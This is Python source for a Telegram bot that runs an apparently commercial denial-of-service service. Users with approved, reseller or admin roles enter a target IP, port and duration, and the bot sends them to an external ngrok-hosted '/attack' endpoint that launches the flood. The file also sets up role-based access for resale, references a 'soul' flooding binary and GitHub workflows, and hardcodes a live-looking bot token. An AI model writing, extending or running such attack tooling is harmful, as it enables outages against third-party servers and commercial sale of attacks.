import os
import json
import logging
import threading
import time
import random
import string
import requests
from datetime import datetime, timedelta
from telegram import Update, KeyboardButton, ReplyKeyboardMarkup, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardRemove
from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters, ConversationHandler, CallbackQueryHandler
from github import Github, GithubException
from flask import Flask
from threading import Thread

# Logging Setup
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Flask App for Keep-Alive
app = Flask('')

@app.route('/')
def home():
    return "Bot is Live!"

def run():
    app.run(host='0.0.0.0', port=8080)

def keep_alive():
    t = Thread(target=run)
    t.start()

# --- CONFIGURATION ---
BOT_TOKEN = "8748437919:AAEI0zQ_-0Umg0wqFAbIvCqF9xjssceudo0"
YML_FILE_PATH = ".github/workflows/main.yml"
BINARY_FILE_NAME = "soul"
BINARY_STORAGE_PATH = "stored_binary.bin"
ADMIN_IDS = [7529105228]
COLAB_API_URL = "https://bubble-sponge-unpicked.ngrok-free.dev/attack"

# --- GLOBAL STATES ---
current_attack = None
attack_lock = threading.Lock()
cooldown_until = 0
COOLDOWN_DURATION = 40
MAINTENANCE_MODE = False
MAX_ATTACKS = 40
user_attack_counts = {}
temp_data = {}

# --- HELPER FUNCTIONS ---
def trigger_colab(target_ip, target_port, duration):
    try:
        payload = {'host': target_ip, 'port': target_port, 'time': duration}
        requests.get(COLAB_API_URL, params=payload, timeout=2)
        logger.info(f"✅ Colab API Triggered for {target_ip}")
    except Exception as e:
        logger.error(f"❌ Colab API Error: {e}")

def load_json(filename, default):
    try:
        with open(filename, 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return default

def save_json(filename, data):
    with open(filename, 'w') as f:
        json.dump(data, f, indent=2)

# Load data on start
approved_users = load_json('approved_users.json', {})
owners = load_json('owners.json', {str(ADMIN_IDS[0]): {"username": "admin", "is_primary": True}})
admins = load_json('admins.json', {})
resellers = load_json('resellers.json', {})
github_tokens = load_json('github_tokens.json', [])
pending_users = load_json('pending_users.json', [])

# Role Checks
def is_owner(user_id): return str(user_id) in owners
def is_admin(user_id): return str(user_id) in admins
def is_reseller(user_id): return str(user_id) in resellers
def is_approved_user(user_id):
    uid = str(user_id)
    if uid in approved_users:
        if approved_users[uid]['expiry'] == "LIFETIME": return True
        return time.time() < approved_users[uid]['expiry']
    return False

def can_user_attack(user_id):
    return (is_owner(user_id) or is_admin(user_id) or is_reseller(user_id) or is_approved_user(user_id))

# Keyboards
def get_main_keyboard(user_id):
    keyboard = [
        [KeyboardButton("🎯 Launch Attack"), KeyboardButton("📊 Check Status")],
        [KeyboardButton("🛑 Stop Attack"), KeyboardButton("🔐 My Access")]
    ]
    if is_owner(user_id) or is_admin(user_id):
        keyboard.append([KeyboardButton("👥 User Management"), KeyboardButton("⚙️ Bot Settings")])
    if is_owner(user_id):
        keyboard.append([KeyboardButton("👑 Owner Panel"), KeyboardButton("🔑 Token Management")])
    keyboard.append([KeyboardButton("❓ Help")])
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

def get_cancel_keyboard():
    return ReplyKeyboardMarkup([[KeyboardButton("❌ Cancel")]], resize_keyboard=True)

# --- COMMAND HANDLERS ---

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not can_user_attack(user_id):
        await update.message.reply_text("📋 **ACCESS REQUEST SENT**\nPlease wait for admin approval.")
        return
    
    reply_markup = get_main_keyboard(user_id)
    await update.message.reply_text("🤖 **MAIN MENU**\nWelcome back!", reply_markup=reply_markup)

async def handle_button_press(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text

    if text == "🎯 Launch Attack":
        if not can_user_attack(user_id): return
        temp_data[user_id] = {"step": "attack_ip"}
        await update.message.reply_text("🎯 **LAUNCH ATTACK**\nSend Target IP:", reply_markup=get_cancel_keyboard())
    
    elif text == "📊 Check Status":
        await update.message.reply_text("✅ Bot is Ready for new attacks!")
    
    elif text == "« Back to Main Menu" or text == "❌ Cancel":
        if user_id in temp_data: del temp_data[user_id]
        await update.message.reply_text("🏠 Back to Menu", reply_markup=get_main_keyboard(user_id))

    else:
        await handle_text_input(update, context, user_id, text)

async def handle_text_input(update: Update, context: ContextTypes.DEFAULT_TYPE, user_id, text):
    if user_id not in temp_data: return
    step = temp_data[user_id].get("step")

    if step == "attack_ip":
        temp_data[user_id].update({"ip": text, "step": "attack_port"})
        await update.message.reply_text(f"✅ IP: `{text}`\nSend Port:")
    
    elif step == "attack_port":
        temp_data[user_id].update({"port": text, "step": "attack_time"})
        await update.message.reply_text(f"✅ Port: `{text}`\nSend Duration (Seconds):")
    
    elif step == "attack_time":
        ip = temp_data[user_id]["ip"]
        port = temp_data[user_id]["port"]
        duration = text
        del temp_data[user_id]
        
        # Trigger Colab API
        trigger_colab(ip, port, duration)
        
        await update.message.reply_text(
            f"🎯 **ATTACK STARTED!**\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"🌐 Target: `{ip}`\n"
            f"🚪 Port: `{port}`\n"
            f"⏱️ Time: `{duration}s`\n"
            f"🔥 **Status:** Attack Sent to Colab API!",
            reply_markup=get_main_keyboard(user_id)
        )

# Main Function
def main():
    keep_alive()
    application = Application.builder().token(BOT_TOKEN).build()

    application.add_handler(CommandHandler("start", start))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_button_press))

    print("🤖 **BOT IS STARTING...**")
    application.run_polling()

if __name__ == '__main__':
    main()
